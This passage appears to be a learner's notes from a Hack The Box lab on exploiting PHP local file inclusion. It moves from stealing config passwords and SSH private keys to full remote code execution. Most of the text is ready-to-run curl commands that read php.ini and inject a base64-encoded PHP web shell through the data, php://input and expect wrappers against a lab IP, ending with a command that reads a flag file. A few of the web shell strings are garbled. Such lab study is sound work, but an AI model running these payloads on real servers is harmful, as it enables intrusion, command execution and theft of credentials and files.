execute code on the back-end servers and gain control over them.


One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session.

we may find the database password in a file like `config.php`, which may match a user's password in case they re-use the same password. Or we can check the `.ssh` directory in each user's home directory,

private key (`id_rsa`) and use it to SSH into the system.

there are ways to achieve remote code execution directly:
vulnerable function without relying on data enumeration or local file privileges
>What this means is: You don’t always need to steal files (like SSH keys) or read sensitive data to get RCE. Instead, if you find a directly vulnerable function, you can execute commands right away


## Data-wrapper
used to include external data, including PHP code
>the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations

>let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability

#### Checking PHP Configurations
`allow_url_include`??????

1- PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache
2- at (`/etc/php/X.Y/fpm/php.ini`) for Nginx
where `X.Y` is your install PHP version.
>start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file.

`.ini` files are similar to `.php` files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:
```bash
AhmaDb0x@htb[/htb]$ curl "http://94.237.58.78:55981/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

```bash
AhmaDb0x@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

>so we can use the `data` wrapper. Knowing how to check for the `allow_url_include` option can be very important, as `this option is not enabled by default`

>and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack


---
It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.

---

#### Remote Code Execution
`allow_url_include` enabled, we can proceed with our `data` wrapper attack.

>the `data` wrapper can be used to include external data, including PHP code.

base64 encode a basic PHP web shell, as follows:
```bash
AhmaDb0x@htb[/htb]$ echo '<?pystem($_GET["cmd"]); ?>' | base64
```
```bash
┌──(pwn㉿kali)-[~]
└─$ echo -n "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==" | jq -sRr @uri

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
```
and then pass it to the data wrapper with `data://text/plain;base64,`.
```bash
http://94.237.58.78:55981/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

```bash
AhmaDb0x@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

## Input-wrapper
used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

we can send a POST request to the vulnerable URL and add our web shell as POST data.
To execute a command, we would pass it as a GET parameter

```bash
 curl -s -X POST --data '<?pstem($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

## Expect-wrapper
directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

>expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server,

>web apps rely on it for their core functionality, so we may find it in specific cases.

We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:

```bash
AhmaDb0x@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

```bash
AhmaDb0x@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```



most common three PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover the `phar` and `zip` wrappers in upcoming sections, which we may use with web applications that allow file uploads to gain remote execution through LFI vulnerabilities.


```bash
http://94.237.58.78:55981/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cd%20/%20;cat%2037809e2f8952f06139011994726d9ef1.txt
```

